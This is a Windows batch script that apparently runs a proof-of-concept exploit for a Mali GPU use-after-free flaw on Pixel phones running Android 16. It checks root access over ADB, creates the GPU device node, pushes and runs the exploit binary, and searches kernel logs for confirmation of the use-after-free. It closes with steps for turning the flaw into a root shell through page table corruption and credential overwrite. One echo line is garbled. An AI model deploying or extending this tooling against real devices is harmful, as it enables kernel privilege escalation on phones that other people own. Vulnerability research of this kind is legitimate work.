@echo off
REM ============================================================
REM  CVE-2025-6349/8045 POC Test Runner
REM  Google Pixel Mali GPU - Windows Batch Version
REM  Target: Android 16, Pixel 7/8/9 (Tokay)
REM  Date: 2026-04-25
REM ============================================================

echo.
echo === CVE-2025-6349/8045 POC Test ===
echo Target: Pixel 9 (Tokay) Android 16
echo.

REM --- Configuration ---
set POC_BIN=mali_uaf_poc
set ADB=adb

REM --- Check ADB Connection ---
echo [*] Checking ADB connection...
%ADB% devices 2>nul | findstr /i /c:"device" >nul
if errorlevel 1 (
    echo [-] ERROR: No device connected via ADB
    echo [*] Please connect your Pixel device and enable USB debugging
    echo [*] Then run: adb devices
    echo.
    pause
    exit /b 1
)

echo [+] Device connected

REM --- Device Info ---
echo.
echo [*] Device info:
for /f "tokens=*" %%a in ('%ADB% shell getprop ro.product.model 2^>nul') do echo   Model: %%a
for /f "tokens=*" %%a in ('%ADB% shell getprop ro.build.version.release 2^>nul') do echo   Android: %%a
for /f "tokens=*" %%a in ('%ADB% shell uname -a 2^>nul') do echo   Kernel: %%a & goto :kernel_done
:kernel_done
echo.

REM --- Check Root ---
echo [*] Checking root access...
%ADB% shell id 2>nul | findstr /i "uid=0" >nul
if not errorlevel 1 (
    echo [+] Device is rooted (uid=0)
) else (
    echo [-] Device is NOT rooted
    echo [*] Rooting required for full exploit
)
echo.

REM --- Check Mali Device ---
echo [*] Checking for Mali GPU device...
%ADB% shell test -c /dev/mali0 2>nul
if not errorlevel 1 (
    echo [+] /dev/mali0 exists
) else (
    %ADB% shell test -c /dev/mali 2>nul
    if not errorlevel 1 (
        echo [+] /dev/mali exists
    ) else (
        echo [-] No Mali device node found
        echo [*] Attempting to create /dev/mali0...
        %ADB% shell "su -c mknod /dev/mali0 c 242 0" 2>nul
        if errorlevel 1 (
            echo [-] Cannot create device node (may need root)
        )
    )
)
echo.

REM --- Clear dmesg ---
echo [*] Clearing dmesg...
%ADB% shell su -c "dmesg -C" 2>nul
if errorlevel 1 %ADB% shell dmesg -C 2>nul
if errorlevel 1 echo   (could not clear dmesg)
echo.

REM --- Check POC Binary ---
if not exist "%POC_BIN%" (
    echo [-] ERROR: POC binary not found: %POC_BIN%
    echo [*] Please run: make
    echo.
    pause
    exit /b 1
)

echo [*] POC binary found: %POC_BIN%
for %%F in ("%POC_BIN%") do echo   Size: %%~zF bytes
echo.

REM --- Deploy POC ---
echo [*] Deploying POC to device...
%ADB% push "%POC_BIN%" /data/local/tmp/ 2>&1 | findstr /v "^$"
if errorlevel 1 (
    echo [-] ERROR: Failed to push POC binary
    pause
    exit /b 1
)

%ADB% shell chmod +x /data/local/tmp/%POC_BIN%
echo [+] POC deployed successfully
echo.

REM --- Run Exploit ---
echo ============================================================
echo [*] Running exploit...
echo ============================================================
echo.

%ADB% shell /data/local/tmp/%POC_BIN% 2>&1
set POC_EXIT=%errorlevel%

echo.
echo ============================================================
echo [*] POC exit code: %POC_EXIT%
echo ============================================================
echo.

REM --- Check dmesg ---
echo [*] Checking dmesg for UAF indicators...
echo.

%ADB% shell su -c "dmesg" 2>nul | findstr /iE "kasan.*use-after-free|use-after-free|double-free|slob|slab|mali|kbase" >nul 2>&1
if not errorlevel 1 (
    %ADB% shell su -c "dmesg" 2>nul | findstr /iE "kasan.*use-after-free|use-after-free|double-free|slob|slab|mali|kbase"
    echo.
    %ADB% shell su -c "dmesg" 2>nul | findstr /iE "kasan.*use-after-free|use-after-free" >nul 2>&1
    if not errorlevel 1 echo [+] UAF CONFIRMED in dmesg!
    %ADB% shell su -c "dmesg" 2>nul | findstr /i "double-free" >nul 2>&1
    if not errorlevel 1 echo [+] DOUBLE-FREE CONFIRMED in dmesg!
) else (
    %ADB% shell dmesg 2>nul | findstr /iE "kasan.*use-after-free|use-after-free|double-free" >nul 2>&1
    if not errorlevel 1 (
        %ADB% shell dmesg 2>nul | findstr /iE "kasan.*use-after-free|use-after-free|double-free"
    ) else (
        echo   (no UAF indicators found)
        echo [*] Full dmesg (last 50 lines):
        %ADB% shell dmesg 2>nul | tail -50
    )
)
echo.

REM --- Check Privileges ---
echo [*] Checking privileges...
%ADB% shell id 2>nul
echo.

REM --- Check SELinux ---
echo [*] Checking SELinux status...
%ADB% shell getenforce 2>nul || echo   (could not check)
echo.

REM --- Summary ---
echo ============================================================
echo Test Summary
echo ============================================================
echo.
echo POC binary: %POC_BIN%
echo Exit code: %POC_EXIT%
echo.
if %POC_EXIT% equ 0 (
    echo [!] POC completed without errors
) else (
    echo [!] POC exited with code %POC_EXIT%
)
echo.
echo Check dmesg output above for:
echo   - 'kasan: slab-use-after-free' (UAF confirmed)
echo   - 'double-free' (double-free confirmed)
echo   - 'mali' or 'kbase' references
echo.
echo For root shell, UAF must be converted to:
echo   1. Page reclaim via GPU memory
ec ho   2. Page table corruption
echo   3. Credential overwrite
echo.
echo ============================================================
pause
exit /b %POC_EXIT%